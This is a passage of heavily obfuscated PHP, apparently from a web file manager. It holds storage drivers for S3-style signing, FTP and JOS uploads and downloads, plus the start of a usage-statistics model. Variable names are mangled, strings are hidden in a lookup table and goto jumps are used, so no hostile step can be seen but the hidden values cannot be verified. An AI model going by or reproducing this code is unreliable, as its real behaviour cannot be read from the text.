$¿·Ï‰[283], $¿·Ï‰[12]), array($¿·Ï‰[281], $¿·Ï‰[284], $¿·Ï‰[12]), array($¿·Ï‰[285] => $ºÁ¦İ‡ƒ), array($¿·Ï‰[286] => $åËÎ·¬°), array($¿·Ï‰[287] => $ÄÃÆé“), array($¿·Ï‰[288] => $ñ¡°„ş), array($¿·Ï‰[289] => $Ûõµ¶“Ú))); $ÚÖÛ§˜Œ = base64_encode(json_encode($µ©Ãê›¢)); $µêüÉ¾ = hash_hmac($¿·Ï‰[290], $•“şêû, $¿·Ï‰[291] . $this->secret, !0); $óòÓ¥Ÿƒ = hash_hmac($¿·Ï‰[290], $this->region, $µêüÉ¾, !0); $îş¯…°± = hash_hmac($¿·Ï‰[290], $“×‘Õí¼, $óòÓ¥Ÿƒ, !0); $¢Äª…À— = hash_hmac($¿·Ï‰[290], $¬Ãø±Ñ¥, $îş¯…°±, !0); $Ú™êçÚÍ = hash_hmac($¿·Ï‰[290], $ÚÖÛ§˜Œ, $¢Äª…À—); $Ú€Ú˜¥ = array($¿·Ï‰[246] => $¿·Ï‰[12], $¿·Ï‰[292] => $¿·Ï‰[12], $¿·Ï‰[280] => $óŞæñÍ, $¿·Ï‰[285] => $ºÁ¦İ‡ƒ, $¿·Ï‰[293] => $ÚÖÛ§˜Œ, $¿·Ï‰[294] => $åËÎ·¬°, $¿·Ï‰[295] => $ÄÃÆé“, $¿·Ï‰[296] => $ñ¡°„ş, $¿·Ï‰[297] => $Ûõµ¶“Ú, $¿·Ï‰[298] => $Ú™êçÚÍ, $¿·Ï‰[208] => $this->getHost()); return $Ú€Ú˜¥; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; public $config = array(); public function __construct($óä½ŠÖ©) { parent::__construct(); if (count($óä½ŠÖ©) > 0) { $this->_init($óä½ŠÖ©); } } public function __destruct() { if (!$this->_isconn(!1)) { return !1; } return @ftp_close($this->connect); } private function charsetReset($£Ø¥İÂß) { $®¦êü¸Œ =& $_SERVER[¢ñàß¿€]; global $config; $this->appCharset = $config[$®¦êü¸Œ[1432]]; $this->systemCharset = $config[$®¦êü¸Œ[1433]]; if (isset($£Ø¥İÂß[$®¦êü¸Œ[1434]]) && $£Ø¥İÂß[$®¦êü¸Œ[1434]]) { $this->systemCharset = $£Ø¥İÂß[$®¦êü¸Œ[1434]]; } } public function iconvApp($ùŸ˜Ò‘‹) { return $this->iconvTo($ùŸ˜Ò‘‹, $this->systemCharset, $this->appCharset); } public function iconvSystem($ı÷©«®») { return $this->iconvTo($ı÷©«®», $this->appCharset, $this->systemCharset); } public function getPathOuter($äãèª¿Ú) { $õÒíİË¿ =& $_SERVER[¢ñàß¿€]; $ÒÁ§„ì– = $this->iconvApp($this->pathBase); $äãèª¿Ú = $this->iconvApp($äãèª¿Ú); if (substr($ÒÁ§„ì–, 0, 2) == $õÒíİË¿[1435]) { $ÒÁ§„ì– = BASIC_PATH . substr($ÒÁ§„ì–, 2); } if (substr($äãèª¿Ú, 0, 2) == $õÒíİË¿[1435]) { $äãèª¿Ú = BASIC_PATH . substr($äãèª¿Ú, 2); } $ÒÁ§„ì– = KodIO::clear($ÒÁ§„ì–); $äãèª¿Ú = KodIO::clear($äãèª¿Ú); $äãèª¿Ú = substr($äãèª¿Ú, strlen($ÒÁ§„ì–)); if (empty($this->pathDriver)) { return $äãèª¿Ú; } return $this->pathDriver . $õÒíİË¿[8] . ltrim($äãèª¿Ú, $õÒíİË¿[8]); } private function _init($üŠĞ…Ù” = array()) { $ƒ‘ØË´Õ =& $_SERVER[¢ñàß¿€]; if (!function_exists($ƒ‘ØË´Õ[1436])) { throw new Exception(LNG($ƒ‘ØË´Õ[1437])); } $this->config = $üŠĞ…Ù”; $this->charsetReset($üŠĞ…Ù”); foreach ($üŠĞ…Ù” as $Î÷¬ê§ => $¦åÁù£³) { if (isset($this->{$Î÷¬ê§})) { $this->{$Î÷¬ê§} = $¦åÁù£³; } } return $this->_login($üŠĞ…Ù”); } private function _login($¶ñÃÑ²¾) { $†ïæÒ®Š =& $_SERVER[¢ñàß¿€]; static $•ä®îõ = array(); $®’œÎû™ = md5(json_encode($¶ñÃÑ²¾)); if (isset($•ä®îõ[$®’œÎû™])) { foreach ($•ä®îõ[$®’œÎû™] as $§ûà¬èç => $ØğóÕÄ) { $this->{$§ûà¬èç} = $ØğóÕÄ; } return !0; } $Íğäšğ¦ = parse_url(trim($this->server, $†ïæÒ®Š[8])); $this->host = $Íğäšğ¦[$†ïæÒ®Š[208]]; $‘¿„î = isset($Íğäšğ¦[$†ïæÒ®Š[207]]) && $Íğäšğ¦[$†ïæÒ®Š[207]] == $†ïæÒ®Š[1438] ? !0 : !1; $this->scheme = $‘¿„î ? $†ïæÒ®Š[1439] : $†ïæÒ®Š[1440]; $this->port = isset($Íğäšğ¦[$†ïæÒ®Š[209]]) ? $Íğäšğ¦[$†ïæÒ®Š[209]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 30); if ($this->connect === !1) { $this->writeLog(LNG($†ïæÒ®Š[1441]) . $this->host . $†ïæÒ®Š[4] . $this->port, !0); return !1; } $ì¿İ³¢ü = @ftp_login($this->connect, $this->username, $this->userpass); if (!$ì¿İ³¢ü) { $this->writeLog(LNG($†ïæÒ®Š[1442]) . $this->username, !0); return !1; } @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $•ÂÙüÖ = $this->pasv == $†ïæÒ®Š[91] ? !0 : !1; @ftp_pasv($this->connect, $•ÂÙüÖ); $•ä®îõ[$®’œÎû™] = array($†ïæÒ®Š[1443] => $this->connect, $†ïæÒ®Š[208] => $this->host, $†ïæÒ®Š[207] => $this->scheme, $†ïæÒ®Š[209] => $this->port); return $ì¿İ³¢ü; } private function _isconn($ûŞ©ëşó = true) { if (is_resource($this->connect)) { return !0; } if (!$ûŞ©ëşó) { return !1; } return $this->_login($this->config); } public function mkfile($äÙÅ¥¯È, $‹€½µ·Å = '', $ƒŠ’æ¤› = REPEAT_RENAME) { if ($this->setContent($äÙÅ¥¯È, $‹€½µ·Å)) { return $this->getPathOuter($äÙÅ¥¯È); } $this->writeLog(LNG($_SERVER[¢ñàß¿€][1444]), !0); return !1; } public function mkdir($ó‡¡áÔÂ, $’‹¥úú = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $ó‡¡áÔÂ = $this->iconvSystem($ó‡¡áÔÂ); if ($this->_isFolder($ó‡¡áÔÂ) || @ftp_mkdir($this->connect, $ó‡¡áÔÂ)) { return $this->getPathOuter($ó‡¡áÔÂ); } if (!$this->mkdir($this->pathFather($ó‡¡áÔÂ))) { return !1; } if ($ó‡¡áÔÂ = @ftp_mkdir($this->connect, $ó‡¡áÔÂ)) { return $this->getPathOuter($ó‡¡áÔÂ); } $this->writeLog(__FUNCTION__ . $_SERVER[¢ñàß¿€][1445], !0); return !1; } public function copyFile($®Õ¼Ä¦‘, $¤÷’å‚ã) { if (!$this->_isconn()) { return !1; } $ØÆŒÕÚˆ = $this->pathThis($this->iconvSystem($®Õ¼Ä¦‘)); $íŠÔ¹¹ƒ = $this->tempFile($ØÆŒÕÚˆ); $ù‰êô– = $this->iconvApp($íŠÔ¹¹ƒ); $this->download($®Õ¼Ä¦‘, $ù‰êô–); $øô”ïØÍ = $this->upload($¤÷’å‚ã, $ù‰êô–); $this->tempFileRemve($íŠÔ¹¹ƒ); return $øô”ïØÍ; } public function moveFile($¸¯£ÈÉ, $¶ûéıå¸) { if (!$this->_isconn()) { return !1; } $¸¯£ÈÉ = $this->iconvSystem($¸¯£ÈÉ); $¶ûéıå¸ = $this->iconvSystem($¶ûéıå¸); $éã”¼ˆ = @ftp_rename($this->connect, $¸¯£ÈÉ, $¶ûéıå¸); if (!$éã”¼ˆ) { $this->writeLog(__FUNCTION__ . $_SERVER[¢ñàß¿€][1445], !0); return !1; } return $this->getPathOuter($¶ûéıå¸); } public function delFile($ÕªÀ“ñ) { if (!$this->_isconn()) { return !1; } $ÕªÀ“ñ = $this->iconvSystem($ÕªÀ“ñ); $Æ”“æÚÆ = @ftp_delete($this->connect, $ÕªÀ“ñ); if (!$Æ”“æÚÆ) { $this->writeLog(__FUNCTION__ . $_SERVER[¢ñàß¿€][1445], !0); } return $Æ”“æÚÆ; } public function delFolder($†¾É—”å) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $ŞÊ€¥ = $÷–©µå¢ = array(); $this->fileList($†¾É—”å, $ŞÊ€¥, $÷–©µå¢, !0); $this->listItemCache = !0; foreach ($÷–©µå¢ as $şêÔ¬¸Š) { $ª¬Äºøó = $this->iconvSystem($şêÔ¬¸Š[$_SERVER[¢ñàß¿€][32]]); $¶ôó€Ñ¿ = @ftp_delete($this->connect, $ª¬Äºøó); if (!$¶ôó€Ñ¿) { return !1; } } foreach ($ŞÊ€¥ as $ª¬Äºøó) { $ª¬Äºøó = $this->iconvSystem($ª¬Äºøó); $¶ôó€Ñ¿ = @ftp_rmdir($this->connect, $ª¬Äºøó); if (!$¶ôó€Ñ¿) { return !1; } } $†¾É—”å = $this->iconvSystem($†¾É—”å); return @ftp_rmdir($this->connect, $†¾É—”å); } public function rename($‹×äïî, $Ô»½¸îÍ) { $Ø›¢Á”Ö =& $_SERVER[¢ñàß¿€]; if (!$this->_isconn()) { return !1; } $‰Ëõ®ô½ = $this->fileNameAuto($this->pathFather($‹×äïî), $Ô»½¸îÍ); $‰Ëõ®ô½ = $this->iconvSystem($‰Ëõ®ô½); $‹×äïî = $this->iconvSystem($‹×äïî); $¡İîà¡À = $this->pathFather($‹×äïî); $”ñ¢â¼ = rtrim($¡İîà¡À, $Ø›¢Á”Ö[8]) . $Ø›¢Á”Ö[8] . $‰Ëõ®ô½; $ÅÈèĞŸÍ = @ftp_rename($this->connect, $‹×äïî, $”ñ¢â¼); if (!$ÅÈèĞŸÍ) { $this->writeLog(__FUNCTION__ . $Ø›¢Á”Ö[1445], !0); return !1; } $”ñ¢â¼ = $this->iconvApp($”ñ¢â¼); return $this->getPathOuter($”ñ¢â¼); } private function folderInfo($Ÿ¤¢Ëş€, $—´ ì÷ = false) { $ö‰ê’¨‘ =& $_SERVER[¢ñàß¿€]; $û¶Ùçë¨ = array($ö‰ê’¨‘[32] => $this->pathThis($Ÿ¤¢Ëş€), $ö‰ê’¨‘[87] => $this->getPathOuter($ö‰ê’¨‘[8] . $Ÿ¤¢Ëş€), $ö‰ê’¨‘[33] => $ö‰ê’¨‘[78]); if ($—´ ì÷) { return $û¶Ùçë¨; } $û¶Ùçë¨[$ö‰ê’¨‘[231]] = $û¶Ùçë¨[$ö‰ê’¨‘[88]] = 0; $û¶Ùçë¨[$ö‰ê’¨‘[232]] = $û¶Ùçë¨[$ö‰ê’¨‘[233]] = !0; return $û¶Ùçë¨; } private function fileInfo($·Ù¶ß»â, $½°ûÜà† = false, $ú¢ØÁ—³ = array()) { $¨ƒîÕ³á =& $_SERVER[¢ñàß¿€]; $Ó¥¡úüš = array($¨ƒîÕ³á[32] => $this->pathThis($·Ù¶ß»â), $¨ƒîÕ³á[87] => $this->getPathOuter($¨ƒîÕ³á[8] . $·Ù¶ß»â), $¨ƒîÕ³á[33] => $¨ƒîÕ³á[230], $¨ƒîÕ³á[79] => isset($ú¢ØÁ—³[$¨ƒîÕ³á[79]]) ? $ú¢ØÁ—³[$¨ƒîÕ³á[79]] : 0, $¨ƒîÕ³á[169] => $this->ext($·Ù¶ß»â)); if ($½°ûÜà†) { return $Ó¥¡úüš; } $Ó¥¡úüš[$¨ƒîÕ³á[231]] = $Ó¥¡úüš[$¨ƒîÕ³á[88]] = 0; $Ó¥¡úüš[$¨ƒîÕ³á[232]] = $Ó¥¡úüš[$¨ƒîÕ³á[233]] = !0; $ ˆš¶ïà = $this->iconvSystem($·Ù¶ß»â); $Ó¥¡úüš[$¨ƒîÕ³á[88]] = @ftp_mdtm($this->connect, $ ˆš¶ïà); if (empty($ú¢ØÁ—³)) { $ú¢ØÁ—³ = $this->objectMeta($·Ù¶ß»â); if (!$ú¢ØÁ—³) { return $Ó¥¡úüš; } } $Ó¥¡úüš[$¨ƒîÕ³á[79]] = $ú¢ØÁ—³[$¨ƒîÕ³á[79]]; return $Ó¥¡úüš; } public function size($Êİíğ÷Ô) { $ôø¡…‰¢ = $this->objectMeta($Êİíğ÷Ô); return $ôø¡…‰¢ ? $ôø¡…‰¢[$_SERVER[¢ñàß¿€][79]] : 0; } public function info($íŞ¯æà) { if ($this->isFile($íŞ¯æà)) { return $this->fileInfo($íŞ¯æà, 0); } else { if ($this->isFolder($íŞ¯æà)) { return $this->folderInfo($íŞ¯æà); } } return !1; } private function fileList($Œ€–„»ì, &$Üø¹Ù«Ï, &$©‰üà¬, $§Äƒˆå¥ = false) { $ÊøğõèÅ =& $_SERVER[¢ñàß¿€]; $Œ€–„»ì = $this->iconvSystem($Œ€–„»ì); if (!$this->isFolder($Œ€–„»ì)) { return !1; } @ftp_chdir($this->connect, $ÊøğõèÅ[8]); $Œ€–„»ì = rtrim($Œ€–„»ì, $ÊøğõèÅ[8]) . $ÊøğõèÅ[8]; check_abort(); $¼ãÜÒ– = @ftp_rawlist($this->connect, $Œ€–„»ì); if (!$¼ãÜÒ–) { $¼ãÜÒ– = array(); } $ãŞõñÙâ = array($ÊøğõèÅ[10] => 1, $ÊøğõèÅ[1360] => 1); foreach ($¼ãÜÒ– as $ßÊû”) { $“ÂÁ½ = $this->_listItem($ßÊû”); if ($“ÂÁ½[0] == $ÊøğõèÅ[829]) { continue; } $Ô…Ë™£® = $“ÂÁ½[8]; if (empty($Ô…Ë™£®) && $Ô…Ë™£® !== $ÊøğõèÅ[228] || isset($ãŞõñÙâ[$Ô…Ë™£®])) { continue; } $Ô…Ë™£® = $this->iconvApp($Œ€–„»ì . ltrim($Ô…Ë™£®, $ÊøğõèÅ[8])); $¨¬Ãßìç = array($ÊøğõèÅ[32] => $Ô…Ë™£®, $ÊøğõèÅ[33] => $ÊøğõèÅ[230], $ÊøğõèÅ[79] => $“ÂÁ½[4]); if (substr($ßÊû”, 0, 1) == $ÊøğõèÅ[1446]) { $¨¬Ãßìç[$ÊøğõèÅ[33]] = $ÊøğõèÅ[78]; $¨¬Ãßìç[$ÊøğõèÅ[79]] = 0; } $›ğÈé¬ = $¨¬Ãßìç[$ÊøğõèÅ[33]] == $ÊøğõèÅ[78] ? !0 : !1; $this->cacheMethodInfoSet($Ô…Ë™£®, $›ğÈé¬, $¨¬Ãßìç); if ($›ğÈé¬) { $Üø¹Ù«Ï[] = $Ô…Ë™£®; if ($§Äƒˆå¥) { $this->fileList($Ô…Ë™£®, $Üø¹Ù«Ï, $©‰üà¬, $§Äƒˆå¥); } continue; } $©‰üà¬[] = $¨¬Ãßìç; } $this->cacheMethodInfoSet($Œ€–„»ì, !0); } private function _listItem($ØêÉ¸‚¾) { if (empty($ØêÉ¸‚¾)) { return array(); } $ÉœÉç¨ß = preg_split($_SERVER[¢ñàß¿€][1447], $ØêÉ¸‚¾); if (count($ÉœÉç¨ß) <= 9) { return $ÉœÉç¨ß; } $ÉœÉç¨ß[8] = trim(substr($ØêÉ¸‚¾, strpos($ØêÉ¸‚¾, $ÉœÉç¨ß[7]) + strlen($ÉœÉç¨ß[7]))); return array_splice($ÉœÉç¨ß, 0, 9); } public function listPath($ƒÚ”û¿”, $Ş÷³·£ã = false) { $£ƒ¢°´ë =& $_SERVER[¢ñàß¿€]; if (!$this->_isconn()) { return !1; } $¸á·ŒÂå = $À§Äö„Ÿ = array(); $this->fileList($ƒÚ”û¿”, $¸á·ŒÂå, $À§Äö„Ÿ); foreach ($¸á·ŒÂå as $™Ú°°Ì¹ => $¹ƒ »¦„) { $¸á·ŒÂå[$™Ú°°Ì¹] = $this->folderInfo($¹ƒ »¦„, $Ş÷³·£ã); } foreach ($À§Äö„Ÿ as $™Ú°°Ì¹ => $¹ƒ »¦„) { $À§Äö„Ÿ[$™Ú°°Ì¹] = $this->fileInfo($¹ƒ »¦„[$£ƒ¢°´ë[32]], $Ş÷³·£ã, $¹ƒ »¦„); } return array($£ƒ¢°´ë[85] => $¸á·ŒÂå, $£ƒ¢°´ë[86] => $À§Äö„Ÿ); } public function has($ø¦ú˜Ëş, $©Ì‚¢åË = false, $à²ÈºØ· = true) { $Ñ°Êš›Ø =& $_SERVER[¢ñàß¿€]; $…¸×î×¥ = $»Êá‹Å = array(); $¹«ùàÙ = $©Ì‚¢åË ? !0 : !1; $this->fileList($ø¦ú˜Ëş, $…¸×î×¥, $»Êá‹Å, $¹«ùàÙ); if ($©Ì‚¢åË) { return array($Ñ°Êš›Ø[239] => count($»Êá‹Å), $Ñ°Êš›Ø[240] => count($…¸×î×¥)); } if ($à²ÈºØ·) { if (count($»Êá‹Å)) { return !0; } } else { if (count($…¸×î×¥)) { return !0; } } return !1; } public function listAll($Ë¯¢ã±®) { $‡ïû£ù¦ =& $_SERVER[¢ñàß¿€]; if (!$this->_isconn()) { return !1; } $Š×Šîã² = $””áìğ = array(); $this->fileList($Ë¯¢ã±®, $Š×Šîã², $””áìğ, !0); $ªà›­Ò• = array_to_keyvalue($””áìğ, $‡ïû£ù¦[32]); foreach ($Š×Šîã² as $ÏİÜú°º) { if (is_string($ÏİÜú°º)) { $ªà›­Ò•[$ÏİÜú°º] = array($‡ïû£ù¦[79] => 0); } } return $this->listAllFiles($Ë¯¢ã±®, $ªà›­Ò•); } public function getContent($¯¶¯Û‰º) { if (!$this->_isconn()) { return !1; } $¯¶¯Û‰º = $this->iconvSystem($¯¶¯Û‰º); return $this->fileSubstr($¯¶¯Û‰º); } public function setContent($‚´üÌİ, $ÌÏÖÓ× = '') { if (!$this->_isconn()) { return !1; } $§·˜²° = $this->pathThis($this->iconvSystem($‚´üÌİ)); $»ªš­¶… = $this->tempFile($§·˜²°); file_put_contents($»ªš­¶…, $ÌÏÖÓ×); $¡°ÙÍƒ§ = $this->upload($‚´üÌİ, $this->iconvApp($»ªš­¶…)); $this->tempFileRemve($»ªš­¶…); return $¡°ÙÍƒ§; } public function fileSubstr($€…§˜¹Â, $Ğšš·È = 0, $Úãş÷çÙ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($€…§˜¹Â, $Ğšš·È, $Úãş÷çÙ); } private function ftpRequest($èÖÔÍÈ–, $Ó¬‡íû” = 0, $ıÔĞ€Âó = false) { $èÖÔÍÈ– = $this->iconvSystem($èÖÔÍÈ–); $ƒó’ÔÏ = $this->scheme . $this->host . $_SERVER[¢ñàß¿€][4] . $this->port; $¾óöÉ›Ñ = curl_init(); curl_setopt($¾óöÉ›Ñ, CURLOPT_URL, $ƒó’ÔÏ . $this->pathEncode($èÖÔÍÈ–)); curl_setopt($¾óöÉ›Ñ, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($ıÔĞ€Âó) { $ôÚÔ¼€á = $Ó¬‡íû” + $ıÔĞ€Âó - 1; curl_setopt($¾óöÉ›Ñ, CURLOPT_RANGE, "{$Ó¬‡íû”}\x2d{$ôÚÔ¼€á}"); } curl_setopt($¾óöÉ›Ñ, CURLOPT_RETURNTRANSFER, 1); $«í¨«Ú« = curl_exec($¾óöÉ›Ñ); curl_close($¾óöÉ›Ñ); return $«í¨«Ú«; } public function upload($Ü²„À´‡, $Ëô²¨‚, $“ğçó…Ã = false, $†‰Êæì = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($Ü²„À´‡))) { return !1; } $Ü²„À´‡ = $this->iconvSystem($Ü²„À´‡); $Ëô²¨‚ = $this->iconvSystem($Ëô²¨‚); $£í£üĞğ = ftp_nb_put($this->connect, $Ü²„À´‡, $Ëô²¨‚, FTP_BINARY); while ($£í£üĞğ == FTP_MOREDATA) { $£í£üĞğ = ftp_nb_continue($this->connect); } if ($£í£üĞğ != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[¢ñàß¿€][1445], !0); return !1; } return $this->getPathOuter($Ü²„À´‡); } public function download($åñ’ú®ç, $±Úí²ï = '') { if (!$this->_isconn()) { return !1; } $©¸Ùğòñ = $this->pathFather($±Úí²ï); if (!IO::mkdir($©¸Ùğòñ)) { return !1; } $åñ’ú®ç = $this->iconvSystem($åñ’ú®ç); $±Úí²ï = $this->iconvSystem($±Úí²ï); $µ¥Ú—´¸ = ftp_nb_get($this->connect, $±Úí²ï, $åñ’ú®ç, FTP_BINARY); while ($µ¥Ú—´¸ == FTP_MOREDATA) { $µ¥Ú—´¸ = ftp_nb_continue($this->connect); } if ($µ¥Ú—´¸ != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[¢ñàß¿€][1445], !0); return !1; } return $this->iconvApp($±Úí²ï); } public function exist($‰ÔïÂ•) { return $this->isFile($‰ÔïÂ•) || $this->isFolder($‰ÔïÂ•); } public function isFile($Ò¥Şé„Ó) { return !$this->isFolder($Ò¥Şé„Ó) && $this->objectMeta($Ò¥Şé„Ó); } public function isFolder($à·ïòÙ¥) { return $this->cacheMethod($_SERVER[¢ñàß¿€][179], $à·ïòÙ¥); } protected function objectMeta($Ù˜Ù½•¾) { return $this->cacheMethod($_SERVER[¢ñàß¿€][181], $Ù˜Ù½•¾); } protected function _objectMeta($‹Ô—å‘±) { $È®•Åœ =& $_SERVER[¢ñàß¿€]; if ($‹Ô—å‘± == $È®•Åœ[12] || $‹Ô—å‘± == $È®•Åœ[8]) { return array(); } if (!$this->_isconn()) { return !1; } $‹Ô—å‘± = $this->iconvSystem($‹Ô—å‘±); $‘Æ“òªÆ = array($È®•Åœ[32] => $this->iconvApp($‹Ô—å‘±), $È®•Åœ[33] => $È®•Åœ[230], $È®•Åœ[79] => 0); @ftp_chdir($this->connect, $È®•Åœ[8]); $„¯èÎÆˆ = @ftp_size($this->connect, $‹Ô—å‘±); if ($„¯èÎÆˆ != -1) { $‘Æ“òªÆ[$È®•Åœ[79]] = $„¯èÎÆˆ; } else { $âÖÍåª½ = @ftp_chdir($this->connect, $‹Ô—å‘±); if (!$âÖÍåª½) { return !1; } $‘Æ“òªÆ[$È®•Åœ[33]] = $È®•Åœ[78]; } return $‘Æ“òªÆ; } protected function _isFolder($ûşº·šÒ) { $ôş†Ç²· =& $_SERVER[¢ñàß¿€]; if ($ûşº·šÒ == $ôş†Ç²·[12] || $ûşº·šÒ == $ôş†Ç²·[8]) { return !0; } $±„†ã×Å = $this->_objectMeta($ûşº·šÒ); return isset($±„†ã×Å[$ôş†Ç²·[33]]) && $±„†ã×Å[$ôş†Ç²·[33]] == $ôş†Ç²·[78] ? !0 : !1; } } class PathDriverJOS extends PathDriverBaseS3 { public function __construct($ãã«ñÓ¦) { parent::__construct($ãã«ñÓ¦); $this->setSignVersion($_SERVER[¢ñàß¿€][247]); } public function uploadLink($¤ÂÄ¯Õ, $Ü§ı¶€ = 0) { $Ó¡ËøšÉ =& $_SERVER[¢ñàß¿€]; if ($this->isUploadServer()) { return; } $±Ğ§Ğº = $this->getType(); if (!in_array($±Ğ§Ğº, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $ĞôğãÊÜ = (!$Ü§ı¶€ ? 1 : ceil($Ü§ı¶€ / pow(1024, 3))) * 3600 * 4; $ÅøáÛ–ç = $this->multiUploadFormData($¤ÂÄ¯Õ, $ĞôğãÊÜ); if ($ÅøáÛ–ç) { $ÅøáÛ–ç[$Ó¡ËøšÉ[97]] = $¤ÂÄ¯Õ; $ÅøáÛ–ç[$Ó¡ËøšÉ[98]] = $±Ğ§Ğº; } return $ÅøáÛ–ç; } public function fileOutImage($Ä¸À ¢, $¨ô“§•ò = 250) { if ($this->size($Ä¸À ¢) > 1024 * 1024 * 25) { return $this->fileOutImageServer($Ä¸À ¢, $¨ô“§•ò); } $¨¿íòçÄ = $this->link($Ä¸À ¢); $¨¿íòçÄ .= $_SERVER[¢ñàß¿€][1448] . $¨ô“§•ò; $this->fileOutLink($¨¿íòçÄ); } public function fileOutLink($¯¥¤ôâ) { $È“™‘ =& $_SERVER[¢ñàß¿€]; if (substr($¯¥¤ôâ, 0, 7) == $È“™‘[313]) { $¯¥¤ôâ = $È“™‘[314] . substr($¯¥¤ôâ, 7); } header($È“™‘[175] . $¯¥¤ôâ); die; } } goto Fª‚ÄÖÒ½; bØ®ª„÷ï†: class AnalysisModel extends ModelBaseLight { public function init($¬¼İüå) { $ø…ñóÁÑ =& $_SERVER[¢ñàß¿€]; $ÀŸ¢ßÉô = array($ø…ñóÁÑ[662] => array($ø…ñóÁÑ[33] => $ø…ñóÁÑ[1897], $ø…ñóÁÑ[350] => array($ø…ñóÁÑ[255], $ø…ñóÁÑ[836], $ø…ñóÁÑ[1898], $ø…ñóÁÑ[1899])), $ø…ñóÁÑ[1900] => array($ø…ñóÁÑ[33] => $ø…ñóÁÑ[1901], $ø…ñóÁÑ[350] => array($ø…ñóÁÑ[255], $ø…ñóÁÑ[834], $ø…ñóÁÑ[1902], $ø…ñóÁÑ[1903], $ø…ñóÁÑ[1904]))); if (!isset($ÀŸ¢ßÉô[$¬¼İüå])) { return !1; } $this->optionType = $ÀŸ¢ßÉô[$¬¼İüå][$ø…ñóÁÑ[33]]; $this->field = $ÀŸ¢ßÉô[$¬¼İüå][$ø…ñóÁÑ[350]]; return !0; } public function listData($„„Á£î¸ = false, $µÚˆÅß = "\155\x6f\x64\151\x66\171\x54\151\x6d\145", $Ç³ñ•¥ = false) { return parent::listData($„„Á£î¸, $µÚˆÅß, $Ç³ñ•¥); } public function trendList($µ©ƒ±ëÌ) { $ÅË”‚À› =& $_SERVER[¢ñàß¿€]; $éÔÓÒ¡ã = $this->listData(); if ($éÔÓÒ¡ã) { $ ¬Óú• = end($éÔÓÒ¡ã); $şùÕ¶’¹ = date($ÅË”‚À›[1905], strtotime($ÅË”‚À›[1906])); if ($ ¬Óú•[$ÅË”‚À›[255]] == $şùÕ¶’¹) { return $éÔÓÒ¡ã; } $åàş¾í› = strtotime($ ¬Óú•[$ÅË”‚À›[255]]); } if (!isset($åàş¾í›)) { $É›ıÄš = $µ©ƒ±ëÌ == $ÅË”‚À›[662] ? $ÅË”‚À›[598] : $ÅË”‚À›[895]; $åàş¾í› = Model($É›ıÄš)->min($ÅË”‚À›[231]); } $šìÔÒèš = $ÅË”‚À›[1907] . ucfirst($µ©ƒ±ëÌ); $¿‚˜–ì¶ = $this->dateList($åàş¾í›); foreach ($¿‚˜–ì¶ as $şùÕ¶’¹) { $this->{$šìÔÒèš}($şùÕ¶’¹); } return $this->listData(); } private function dateList($¯Óå©Öê) { $ÄÈ°Š»Ú =& $_SERVER[¢ñàß¿€]; $‚»ŒÓ = $¯Óå©Öê; $ºÎ‰¾û = strtotime($ÄÈ°Š»Ú[1906]); $Ùã¬öŸ = array(); while ($‚»ŒÓ <= $ºÎ‰¾û) { $Ùã¬öŸ[] = date($ÄÈ°Š»Ú[1905], $‚»ŒÓ); $‚»ŒÓ = strtotime($ÄÈ°Š»Ú[1908], $‚»ŒÓ); } return $Ùã¬öŸ; } public function _recordUser($ÅÚ™‚¸Š = '') { $ìÓ·šø =& $_SERVER[¢ñàß¿€]; $¾ÑöÇ‚£ = strtotime(date($ìÓ·šø[1909], strtotime($ÅÚ™‚¸Š))); $šŠÈ‚Ò¡ = strtotime(date($ìÓ·šø[1910], strtotime($ÅÚ™‚¸Š))); $»õ˜¨Ë™ = array($ìÓ·šø[231] => array($ìÓ·šø[1088], $šŠÈ‚Ò¡)); $½¡’¡¹™ = Model($ìÓ·šø[598])->where($»õ˜¨Ë™)->count($ìÓ·šø[1770]); $»õ˜¨Ë™[$ìÓ·šø[231]] = array($ìÓ·šø[409], array($¾ÑöÇ‚£, $šŠÈ‚Ò¡)); $Œûõ—‰˜ = Model($ìÓ·šø[598])->where($»õ˜¨Ë™)->count($ìÓ·šø[1770]); $»õ˜¨Ë™[$ìÓ·šø[33]] = $ìÓ·šø[1911]; $ãûñö‘Ò = Model($ìÓ·šø[1912])->where($»õ˜¨Ë™)->count($ìÓ·šø[1913]); $®Š×§±Á = array($ìÓ·šø[255] => $ÅÚ™‚¸Š, $ìÓ·šø[836] => (int) $½¡’¡¹™, $ìÓ·šø[1898] => (int) $Œûõ—‰˜, $ìÓ·šø[1899] => (int) $ãûñö‘Ò); return $this->insert($®Š×§±Á); } public function _recordStore($•ŠµÊíî = '') { $Ç©¯‹†Ñ =& $_SERVER[¢ñàß¿€]; $»öÅí’å = strtotime(date($Ç©¯‹†Ñ[1910], strtotime($•ŠµÊíî))); $ùÍÑµ¨â = array($Ç©¯‹†Ñ[231] => array($Ç©¯‹†Ñ[1088], $»öÅí’å)); $¤Ì˜½òº = Model($Ç©¯‹†Ñ[544])->where($ùÍÑµ¨â)->sum($Ç©¯‹†Ñ[79]); $ùÍÑµ¨â[$Ç©¯‹†Ñ[485]] = 0; $¨Û÷„¼ = Model($Ç©¯‹†Ñ[895])->where($ùÍÑµ¨â)->sum($Ç©¯‹†Ñ[79]); $ùÍÑµ¨â[$Ç©¯‹†Ñ[190]] = 1; $¼ã›İãŠ = Model($Ç©¯‹†Ñ[895])->where($ùÍÑµ¨â)->sum($Ç©¯‹†Ñ[79]); $ùÍÑµ¨â[$Ç©¯‹†Ñ[190]] = 2; $™šş›”• = Model($Ç©¯‹†Ñ[895])->where($ùÍÑµ¨â)->sum($Ç©¯‹†Ñ[79]); $ßı½öĞ = array($Ç©¯‹†Ñ[255] => $•ŠµÊíî, $Ç©¯‹†Ñ[834] => (int) $¨Û÷„¼, $Ç©¯‹†Ñ[1902] => (int) $¤Ì˜½òº, $Ç©¯‹†Ñ[1903] => (int) $¼ã›İãŠ, 